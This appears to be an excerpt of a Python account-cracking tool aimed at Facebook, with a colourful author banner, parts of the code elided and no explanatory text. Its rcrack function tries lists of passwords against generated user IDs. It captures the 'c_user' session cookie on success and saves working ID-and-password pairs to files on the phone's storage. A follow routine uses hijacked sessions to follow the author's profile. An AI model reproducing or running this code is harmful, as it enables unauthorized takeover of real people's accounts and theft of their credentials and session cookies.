...
def saiya():
    ...
    print('\033[1;35m[1] RANDOM ID CLONE \033[1;33m[BANGLADESH]')
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/TurRealabbu1', {
...
logo =("""\033[1;32m
 ...
 | |__| |_| |_ ____) / ____ \| |\  |  / . \| |__| |
  \____/|_____|_____/_/    \_\_| \_| /_/ \_\_____/ 
       ...
       ┌━━━━━━━━━━━━━━━━━ JISAN ━━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  Itz Jisan            
               \033[1;91mFACEBOK      :  Itz Jisan Xhowdhury              
               \033[1;97mGITHUB       :  Itz-jisan       
               \033[1;91mSTATUS       :   PREMIUM           
               \033[1;97mTEAM         :  Team Xudi Nah               
               \033[1;91mTOOL VIRSION :  2.00                    
               \033[1;97mTOOL WORK    :   DATA & WIFI          
      \033[1;32m └━━━━━━━━━━━━━━━━━ FMZ XUDI NAH  ━━━━━━━━━━━━━━━━┘""")
loop = 0
oks = []
cps = []
def linex():
...
try:
    ...
    open('.prox.txt','w').write(prox)
	  ...
	  print('WELCOME TO ITZ JISAN TOOLS🔥')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\r\033[1;37m[JISAN\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[JISAN-OK🔥] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/JISAN-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[JISAN-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/JISAN-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
